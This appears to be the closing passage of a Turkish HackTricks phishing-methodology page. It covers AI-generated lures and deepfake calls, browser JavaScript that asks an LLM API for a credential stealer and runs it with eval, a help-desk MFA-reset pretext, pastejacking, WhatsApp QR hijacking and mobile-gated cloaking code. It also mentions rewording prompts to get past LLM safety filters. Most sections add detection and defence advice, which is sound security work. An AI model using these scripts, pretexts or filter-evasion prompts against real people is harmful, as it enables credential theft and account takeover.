|Automation|Rastgeleleştirilmiş wording ve tracking link'leriyle >100 k email / SMS oluşturup gönderme.|
|Generative AI|Public M&A bilgilerine ve sosyal medyadaki inside joke'lara referans veren *tek kullanımlık* email'ler üretme; callback scam'de CEO'nun deep-fake voice'unu kullanma.|
|Agentic AI|Domain'leri otonom olarak register etme, open-source intel scrape etme, kurban bir link'e tıklayıp cred'leri göndermediğinde next-stage mail'leri hazırlama.|

**Defence:**
• Güvenilmeyen automation tarafından gönderilen mesajları vurgulayan **dynamic banner'lar** ekleyin (ARC/DKIM anomalies aracılığıyla).
• High-risk telefon talepleri için **voice-biometric challenge phrase'leri** uygulayın.
• Awareness programme'larında AI-generated lure'ları sürekli olarak simüle edin – static template'ler artık obsolete.

Credential phishing için agentic browsing abuse hakkında ayrıca bkz.:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory ve detection için AI agent'ların local CLI tools ve MCP'yi abuse etmesi hakkında ayrıca bkz.:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Phishing JavaScript'inin LLM destekli runtime assembly'si (in-browser codegen)

Attackers, **trusted bir LLM API'sinden** JavaScript isteyerek ve bunu browser içinde çalıştırarak (ör. `eval` veya dynamic `<script>`) zararsız görünen HTML gönderebilir ve **stealer'ı runtime'da üretebilir**.<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** Exfil URL'lerini/Base64 string'lerini prompt içine encode etme; safety filter'larını aşmak ve hallucination'ları azaltmak için wording'i yineleme.
2. **Client-side API call:** Load sırasında JS, public bir LLM'yi (Gemini/DeepSeek/etc.) veya bir CDN proxy'sini çağırır; static HTML'de yalnızca prompt/API call bulunur.
3. **Assemble & exec:** Response'u birleştirip çalıştırma (ziyaret başına polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code lure'u kişiselleştirir (ör. LogoKit token parsing) ve creds'i prompt-hidden endpoint'e gönderir.

**Evasion traits**
- Traffic, well-known LLM domain'lerine veya güvenilir CDN proxy'lerine ulaşır; bazen bir backend'e WebSockets üzerinden bağlanır.
- Static payload yoktur; malicious JS yalnızca render sonrasında mevcut olur.
- Non-deterministic generation'lar her session için **unique stealer'lar** üretir.

**Detection ideas**
- JS etkinleştirilmiş sandbox'lar çalıştırın; **LLM response'larından kaynaklanan runtime `eval`/dynamic script creation** durumlarını işaretleyin.
- LLM API'lerine yapılan front-end POST'larını ve hemen ardından dönen text üzerinde kullanılan `eval`/`Function` çağrılarını arayın.
- Client traffic içinde yetkisiz LLM domain'leri ve ardından gerçekleşen credential POST'ları için alert oluşturun.

---

## MFA Fatigue / Push Bombing Variant – Zorunlu Sıfırlama
Classic push-bombing'in yanı sıra operatörler, help-desk görüşmesi sırasında basitçe **yeni bir MFA registration'ını zorunlu kılarak** kullanıcının mevcut token'ını geçersiz hale getirir. Bundan sonraki herhangi bir login prompt'u kurbana legitimate görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta olaylarını izleyin; **`deleteMFA` + `addMFA`** olaylarının **aynı IP'den dakikalar içinde** gerçekleşip gerçekleşmediğini kontrol edin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatted bir web sayfasından kötü amaçlı komutları kurbanın panosuna sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırması için kandırarak herhangi bir indirme veya ek olmadan keyfi kod çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing ve Malicious App Distribution (Android ve iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR social engineering ile WhatsApp device-linking hijack
* Bir lure sayfası (ör. sahte bir bakanlık/CERT “channel” sayfası), WhatsApp Web/Desktop QR kodunu görüntüler ve kurbana bunu taramasını söyleyerek saldırganı sessizce **linked device** olarak ekler.<sup>[[10]](#references)</sup>
* Saldırgan, session kaldırılana kadar sohbetleri ve contact görünürlüğünü hemen elde eder. Kurbanlar daha sonra “new device linked” bildirimi görebilir; defender'lar, güvenilmeyen QR sayfalarının ziyaret edilmesinden kısa süre sonra gerçekleşen beklenmeyen device-link event'lerini hunt edebilir.

### crawlers/sandboxes'ı atlatmak için mobile-gated phishing
Operatörler, desktop crawlers'ın final sayfalara ulaşmasını önlemek için phishing akışlarını giderek daha fazla basit bir device check arkasında gizliyor. Yaygın bir pattern, touch özelliğini destekleyen bir DOM'u test eden ve sonucu bir server endpoint'ine gönderen küçük bir script'tir; non-mobile client'lar HTTP 500 (veya boş bir sayfa) alırken mobile user'lara tam flow sunulur.<sup>[[6]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sunucu davranışı sıklıkla şu şekilde gözlemlenir:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- Sonraki GET isteklerinde `is_mobile=false` olduğunda 500 (veya placeholder) döndürür; phishing içeriğini yalnızca `true` olduğunda sunar.

Hunting ve detection sezgisel kuralları:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobile olmayan istemci için HTTP 500 sıralaması; meşru mobile kurban yolları, devamında HTML/JS ile birlikte 200 döndürür.
- İçeriği yalnızca `ontouchstart` veya benzer device kontrollerine göre sunan sayfaları engelleyin veya incelemeye alın.

Defence ipuçları:
- Gated içeriği ortaya çıkarmak için crawler'ları mobile benzeri fingerprint'ler ve etkin JS ile çalıştırın.
- Yeni kaydedilmiş domain'lerde `POST /detect` sonrasında gelen şüpheli 500 yanıtları için alert oluşturun.

## References

- [1] [Phishing'de Kullanılan Domain Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [EvilnoVNC ile session'ları çalma ve 2FA'yı bypass etme (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Debian Wheezy üzerinde DKIM'i Postfix ile Kurma ve Yapılandırma (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobile-gated phishing altyapısı ve sezgisel kuralları (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Hijacking traffic to Microsoft's windows.com with bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
